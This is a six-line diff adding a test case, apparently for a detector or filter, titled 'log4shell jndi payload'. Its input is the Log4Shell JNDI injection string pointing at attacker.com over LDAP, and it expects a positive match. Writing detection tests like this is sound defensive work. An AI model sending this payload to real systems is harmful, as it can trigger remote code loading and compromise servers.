@@ -1,0 +1,6 @@
+--TEST--
+log4shell jndi payload
+--INPUT--
+${jndi:ldap://attacker.com/x}
+--EXPECTED--
+1
